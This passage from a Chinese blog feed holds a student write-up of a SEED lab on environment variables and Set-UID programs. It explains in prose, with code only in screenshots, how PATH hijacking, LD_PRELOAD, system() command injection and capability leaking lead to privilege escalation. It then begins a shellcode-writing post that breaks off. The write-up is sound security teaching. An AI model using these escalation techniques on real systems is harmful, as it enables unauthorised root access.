src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211758287.png" alt="image-20231104211758287"></p><p>4.unset取消环境变量</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 取消刚刚设置的环境变量TASK1</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 打印查看，取消成功</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211809880.png" alt="image-20231104211809880"></p><h1 id="二、-Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#二、-Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="二、   Task 2: Passing Environment Variables from Parent Process to Child Process"></a>二、   Task 2: Passing Environment Variables from Parent Process to Child Process</h1><p>Ø Step1：编译运行myprintenv.c，生成a.out写入文件child</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211815305.png" alt="image-20231104211815305"></p><p>Ø Step2：修改myprintenv.c文件，注释子进程中的printenv函数，并取消父进程中的注释，再次编译，将结果保存在另一个文件parent中</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211821217.png" alt="image-20231104211821217"></p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211825088.png" alt="image-20231104211825088"></p><p>Ø Step3：通过 differ 命令对 child 文件和 parent 文件内容进行比较，发现没有输出，说明二者内容相同，即子进程继承了父进程的环境变量。</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211908584.png" alt="image-20231104211908584"></p><p>Ø 解释：</p><p>这里使用了fork函数生成子进程，就不得不说到fork函数的实现机理</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> Fork函数特点是：一次调用，两次返回，fork给父进程返回子进程pid，给其拷贝出来的子进程返回0</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 针对以上原理，fork函数的左右是把父进程的资源拷贝一份给子进程，体现到变量上，他们的虚拟地址就是一样的，所以可以说，子进程父进程共享环境变量，或者子进程继承了父进程的环境变量。</p><h1 id="三、-Task-3-Environment-Variables-and-execve"><a href="#三、-Task-3-Environment-Variables-and-execve" class="headerlink" title="三、  Task 3: Environment Variables and execve()"></a>三、  Task 3: Environment Variables and execve()</h1><p>Ø Step1： 编译运行myenv.c观察输出：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211917364.png" alt="image-20231104211917364"></p><p>发现无输出。</p><p>Ø Step2：修改myenv.c的代码，把当下进程的环境变量添加到函数当中作为参数：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211922699.png" alt="image-20231104211922699"></p><p>Ø Step3：编译运行修改过的myenv.c文件，观察输出：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211928106.png" alt="image-20231104211928106"></p><p>Ø 解释：</p><p>为了解释这个现象。不得不回到本质去理解exceve（）函数的调用过程：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 由于在上一次shellcode编写已经详细说明此函数的参数解释，所以首先简单回顾一下此函数的形参：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211936384.png" alt="image-20231104211936384"></p><p>第三个参数就是环境变量参数。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 该函数与fork函数不同，它不是创建的是一个新的进程，而是调用一个新的进程，原进程的各种数据都会被新调用的进程覆盖，从而会导致原进程的环境变量丢失，解释了第一次编译运行结果为空。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 但是我们可以通过extern char **environ;获取环境变量表，向环境变量参数位置传入，从而将当前进程的环境变量传递给新调用进程的环境变量。正如第二次编译运行结果展示。</p><h1 id="四、-Task-4-Environment-Variables-and-system"><a href="#四、-Task-4-Environment-Variables-and-system" class="headerlink" title="四、   Task 4: Environment Variables and system()"></a>四、   Task 4: Environment Variables and system()</h1><p>Ø Step1：创建sys.c调用system函数，运行命令“&#x2F;usr&#x2F;bin&#x2F;env”</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211942901.png" alt="image-20231104211942901"></p><p>Ø Step2：编译运行该文件，成功打印出环境变量：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211953331.png" alt="image-20231104211953331"></p><p>Ø 解释：</p><p>为了解释这个实验现象，主要是理解system函数的调用过程：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 这个函数的功能是执行传出的命令参数</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 执行过程是先调用 fork()函数创建子进程</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 子进程继承父进程的环境变量，并调用excel函数执行“&#x2F;bin&#x2F;sh”，即产生一个shell，</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 随后excel再调用exceve并将环境变量数组传递给新调用的进程。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 命令执行完毕比之后会回到原进程。</p><p>这也就解释了为何system（）会打印出原来的进程的环境变量。</p><h1 id="五、-Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#五、-Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="五、   Task 5: Environment Variable and Set-UID Programs"></a>五、   Task 5: Environment Variable and Set-UID Programs</h1><p>Ø Step1：编写一个程序打印当前进程的环境变量：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212001073.png" alt="image-20231104212001073"></p><p>Ø Step2：编译运行foo.c程序：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212005944.png" alt="image-20231104212005944"></p><p>Ø Step3：为该程序设置root权限并设置为Set-UID程序：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212021132.png" alt="image-20231104212021132"></p><p>Ø Step4：在普通用户权限下（$表示为普通用户；#为 root），对 PATH、LD_LIBRARY_PATH 和 ANY_NAME（自己取名和设置的环境变量）环境变量进行设置：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212026457.png" alt="image-20231104212026457"></p><p>Ø 此时再运行foo，观察我们刚刚设置的环境变量是否被打印：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212031231.png" alt="image-20231104212031231"></p><p>发现LD_LIBRARY_PATH并没有设置成功。</p><p>Ø 解释：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 首先解释LD_LIBRARY_PATH 环境变量的作用：用于指定动态链接库除了默认路径外的其他路径，也就是外部的动态链接库路径LD_LIBRARY_PATH环境变量是一个危险的环境变量，因为它可以改变系统默认的库加载路径，可能会导致系统中的其他程序出现问题。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 此时攻击者可以联合Set-UID程序（让使用者暂时拥有创建者的权限）修改环境变量，让程序连接到外部恶意的动态链接库上。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 但是动态链接器拥有一个安全检查机制：会对 RUID（进程真正拥有者）和 EUID（进程允许访问者）进行比较：若 RUID≠EUID，则此时链接器就 会忽略 LD_LIBRARY_PATH 环境变量，从而使得该程序更加安全。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 这也就解释了为何当我们以root身份创建Set-UID程序后以普通用户身份设置LD_LIBRARY_PATH未成功的原因。</p><h1 id="六、-Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#六、-Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="六、   Task 6: The PATH Environment Variable and Set-UID Programs"></a>六、   Task 6: The PATH Environment Variable and Set-UID Programs</h1><p>Ø Step1：首先编写两个程序，task6.c用于使用system执行ls命令；ls.c用于执行恶意程序，编译运行ls.c检查程序：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212040176.png" alt="image-20231104212040176"></p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212044167.png" alt="image-20231104212044167"></p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212048992.png" alt="image-20231104212048992"></p><p>Ø Step2：编译运行task6.c，并修改为root权限，设置为Set-UID程序：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212054343.png" alt="image-20231104212054343"></p><p>Ø Step3：关闭保护机制：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212100552.png" alt="image-20231104212100552"></p><p>Ø Step4：将恶意程序的path添加到PATH中：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212104929.png" alt="image-20231104212104929"></p><p>Ø 接下来再次运行task6，成功执行恶意代码：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212114125.png" alt="image-20231104212114125"></p><p>Ø 为了拿到root权限，可以利用已经设置为Set-UID程序的ls调用一个新的shell：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212118775.png" alt="image-20231104212118775"></p><p>如图，已经获得root权限。</p><p>Ø 解释：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 为何可以运行恶意代码：因为我们在调用system的时候使用的是相对路径“ls”，于是我们就可以将前面的PATH环境变量修改至恶意代码处，则运行 Set-UID 程序时，就会链接到我们写的ls程序处。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 为何可以得到root权限：在ls中写入“&#x2F;bin&#x2F;sh”即会调用一个新的shell，由于此时的task6是Set-UID程序，所以当调用一个新的shell时会赋予其创建者的所有权（root），也就拿到了root权限。</p><h1 id="七、-Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#七、-Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="七、   Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>七、   Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h1><p>Ø Step1：创建好实验所需要的两个程序：mylib.c与myprog.c:</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> Mylib.c实现一个新的sleep函数，打印字符串，是新的动态链接库</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212130563.png" alt="image-20231104212130563"></p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> Myprog.c执行原本的sleep函数——休眠1s。</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212134984.png" alt="image-20231104212134984"></p><p>Ø Step2：将 mylib.c 编译为动态链接库libmylib.so.1.0.1，由于操作系统优先搜索我们指定的路径，所以会优先执行libmylib.so.1.0.1中的sleep函数：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212139271.png" alt="image-20231104212139271"></p><p>Ø Step3：设置LD_PRELOAD环境变量：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212143465.png" alt="image-20231104212143465"></p><p>Ø Step4：编译myprog.c，使其与动态链接库位于同一目录下：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212147842.png" alt="image-20231104212147842"></p><p>Ø Step5：在以下四种情况下运行myprog文件：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 普通用户：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212152511.png" alt="image-20231104212152511"></p><p>发现执行了动态链接库中的sleep函数。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 将myprog设置为Set-UID程序，设置root权限，在普通用户下运行：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212156785.png" alt="image-20231104212156785"></p><p>发现执行的是系统sleep函数。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 登录root用户，在root下设置LD_PRELOAD路径再执行（保持myprog的Set-UID程序和root权限）</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212202416.png" alt="image-20231104212202416"></p><p>发现执行的是动态链接库中的sleep函数。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 将 myprog 设置为 Set-UID user1 程序，在seed用户下设置 LD_PRELOAD 环境变量并运行：</p><ul><li>先创建一个新的用户user1：</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212209540.png" alt="image-20231104212209540"></p><ul><li>在seed下将 myprog 设置为 Set-UID user1 程序并添加环境变量运行：</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212223962.png" alt="image-20231104212223962"></p><p>发现执行的是系统sleep函数。</p><p>Ø Step6：设计实验解释现象：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 猜测是由于在不同的情况下shell进程（父进程）与myprog进程（子进程）之间环境变量LD_PRELOAD是否被子进程继承到产生最后结果的差异，所以利用myprintenv.c在四种情况下分别比较该环境变量是否相同来解释。</p><ul><li>Seed下保持LD_PRELOAD的设置</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212230719.png" alt="image-20231104212230719"></p><ul><li>Step6.1：在普通用户下运行myprintenv.c，分别比较父子进程的输出：</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212253590.png" alt="image-20231104212253590"></p><p>原因：此时子进程继承父进程的环境变量，所以子进程 myprog能使用新的sleep函数。</p><ul><li>Step6.2：将 myprintenv 设置为 Set-UID root 程序，在普通用户下运行，比较输出文件child2与parent2是否有不同：</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212258764.png" alt="image-20231104212258764"></p><p>原因：此时myprog 程序所有者是 root， 而程序运行者是 seed，RUID 和 EUID 没有一致，那么LD_PRELOAD变量就被myprog忽略了，所以此时执行原来的sleep函数。</p><ul><li>Step6.3：将 myprintenv 设置为 Set-UID root 程序，在 root 下设置 LD_PRELOAD 环境变量并运行查看输出文件是否有不同：</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212311615.png" alt="image-20231104212311615"></p><p>原因：myprog 程序所有者是 root， 而程序运行也是root，RUID和EUID一致，那么LD_PRELOAD设置成功，所以此时执行新的sleep函数。</p><ul><li>将 myprintenv 设置为 Set-UID user1 程序，在 seed 用户 下设置 LD_PRELOAD 环境变量并运行，查看输出文件是否有不同：</li></ul><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212323674.png" alt="image-20231104212323674"></p><p>原因：此时 myprog 程序所有者是user1，而程序运行者是seed，RUID 和 EUID 没有一致，那么LD_PRELOAD变量就被myprog忽略了，所以此时执行原来的sleep函数。</p><p>Ø 总结：动态链接库具有保护机制，当RUID与EUID不同时，指示动态链接库的LD_PRELOAD环境变量就会被忽略；当一致时，LD_PRELOAD环境变量让链接器将sleep()函数和用户的代码链接起来，并且将该环境变量加入新的共享库，程序会调用新的sleep()函数。</p><h1 id="八、-Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#八、-Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="八、   Task 8: Invoking External Programs Using system() versus execve()"></a>八、   Task 8: Invoking External Programs Using system() versus execve()</h1><p>Ø Step1：创建task8.c文件，内容为实验手册代码：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212333968.png" alt="image-20231104212333968"></p><p>该程序实现了如下功能：输入文件名，查找文件，但不能够对文件进行修改。</p><p>实现方式为：command &#x3D; v[0]+v[1]，即 command &#x3D; &#x2F;bin&#x2F;cat v[1]，随后使用system（）执行此命令。</p><p>Ø Step2：首先在root权限下新建一个test目录并在其中新建一个test.txt测试文件，查看test.txt文件的权限为不可写、不可删。 </p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212339459.png" alt="image-20231104212339459"></p><p>Ø Step3：随后编译task8.c为root权限下的Set-UID程序，运行它，查找test.txt文件：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212345008.png" alt="image-20231104212345008"></p><p>Ø Step4：尝试越权：</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 由于system函数会调用shell，所以尝试在.&#x2F;task8之后构造bash命令，这样由于该程序还是Set-UID程序，所以在shell中就会拿到root权限：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212350067.png" alt="image-20231104212350067"></p><p>Ø Step5：注释掉 system()，改用 execve()函数，再重复上述操作：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212355223.png" alt="image-20231104212355223"></p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212359430.png" alt="image-20231104212359430"></p><p>Ø 结果解释：</p><p>这个实验非常巧妙地证实了system函数与exceve函数的调用差异，</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> System函数的调用会利用fork函数创建一个子进程，经过一个shell，这样就给我们“从输入上拼接命令”一个实现的可能，因为shell会自动去执行我们分号以后的命令，又由于本身程序是一个Set-UID程序，从而获取到了root权限。</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> Exceve函数则不会调用fork函数，而是直接调用一个新的进程，也就不会调用一个shell，那么拼接命令越权就难以实现。安全性比system函数高。</p><h1 id="九、-Task-9-Capability-Leaking"><a href="#九、-Task-9-Capability-Leaking" class="headerlink" title="九、   Task 9: Capability Leaking"></a>九、   Task 9: Capability Leaking</h1><p>Ø Step1：新建task9.c程序，理解代码含义：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212408048.png" alt="image-20231104212408048"></p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 该代码原本的含义是希望在执行打开“&#x2F;etc&#x2F;zzz”打印文件标识符以后，就降低root权限，但是由于改代码执行的流程是：先打开文件，获得了读写权限，再将进程的EUID设置为当前用户，降低权限，特殊的读写权限没有收回，就存在权限泄露的问题。</p><p>Ø Step2：以root权限创建etc目录，新建zzz文件，赋权0644：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212415103.png" alt="image-20231104212415103"></p><p>Ø Step3：修改task9.c下的文件路径：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212419481.png" alt="image-20231104212419481"></p><p>Ø Step4：编译task9.c，设置为Set-UID root程序:</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212428421.png" alt="image-20231104212428421"></p><p>Ø Step5:运行task9，尝试写入一些内容到zzz中：</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212433607.png" alt="image-20231104212433607"></p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104212438753.png" alt="image-20231104212438753"> </p><p>发现成功写入！</p><p>Ø 解释：详细解释见Step1的代码含义解释。</p><h1 id="十、-总结"><a href="#十、-总结" class="headerlink" title="十、   总结"></a>十、   总结</h1><p>Ø 本次实验主要利用环境变量进行了3个方面的攻击，第一种是动态链接器+Set-UID程序提权攻击，第二种是system+Set-UID程序攻击；第三种是Set-UID出现的权限泄露。而且在实验过程中，我们主要是理解环境变量的漏洞原理，清楚了Set-UID程序的运行机制、进程创建的环境变量传递关系、操作系统对环境变量的搜寻机制、一些系统调用函数、shell命令变量的实现机理。</p><p>Ø 经过本次实验，再软件从开发过程中，我们要特别注意环境变量的设置，为了防止恶意构造的命令执行，应该使用更安全的函数，如 execve，来直接执行可执行文件而不是system函数。</p><p>Ø setuid 函数用于将进程的 EUID 设置为指定的 UID。然而，为了防止权限泄露问题的出现，需要及时控制和清理特权能力。</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> envp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode编写</title>
      <link href="/2023/11/04/shellcode%E7%BC%96%E5%86%99/"/>
      <url>/2023/11/04/shellcode%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>shellcode广泛用于许多涉及代码注入的攻击中。编写shellcode是相当有挑战性的。虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的。shellcode中涉及到几种有趣的技术。本实验室的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode。</p><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址。在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用调用函数时，其地址被推入堆栈（作为返回地址）。两种解决方案都非常优雅，我们希望学生能够学习这两种技术。</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><p>特别需要注意的是一定要清楚本次实验的存储方式是“<strong>小端</strong>”存储。否则在写汇编代码时会把各种字符串的处理搞反。</p><h1 id="一、-Task-1-Writing-Shellcode"><a href="#一、-Task-1-Writing-Shellcode" class="headerlink" title="一、   Task 1: Writing Shellcode"></a>一、   Task 1: Writing Shellcode</h1><h2 id="Task-1-a-The-Entire-Process"><a href="#Task-1-a-The-Entire-Process" class="headerlink" title="Task 1.a: The Entire Process"></a>Task 1.a: The Entire Process</h2><p>在1.a中我们将学习如何从头开始编写一个shellcode，题目给了一个汇编程序mysh.s，接下来我们将基于这个汇编代码编写shellcode，实验以32位为例。</p><ol><li>编译汇编文件：</li></ol><p>我们使用 nasm 编译汇编代码(mysh.s) 。</p><p>​                               <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210842872.png" alt="image-20231104210842872"></p><p>nasm ：用于 Intel x86和 x64架构的汇编和反汇编程序。-f -elf32选项表明我们希望将代码编译为32位 ELF 二进制格式。可执行与可链接格式(ELF)是可执行文件、目标代码、共享库的通用标准文件格式。对于64位的汇编代码，应使用 elf64。</p><ol start="2"><li>链接，生成可执行文件mysh：</li></ol><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210858588.png" alt="image-20231104210858588"></p><p>elf_i386：生成32位的elf二进制可执行文件</p><p>在这之后-o 得到最后的可执行文件mysh。 </p><ol start="3"><li>通过echo来验证此时系统已经运行了一个shell：</li></ol><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210908625.png" alt="image-20231104210908625"></p><ol start="4"><li>生成机器码：</li></ol><p>使用 objecdump 命令反汇编可执行文件或目标文件：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210918344.png" alt="image-20231104210918344"></p><p>原有的汇编代码，可以与上面的汇编代码进行对照是一样的，而objecdump还得到了汇编指令的机器码，：</p><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210924873.png" alt="image-20231104210924873"></p><ol start="5"><li>为了方便编写，我们使用xxd来获取整个文件的二进制代码，在其中我们可以找到上面的机器码:</li></ol><p> <img src="/2023/11/04/shellcode%E7%BC%96%E5%86%99/image-20231104210936333.png" alt="image-20231104210936333"></p><ol 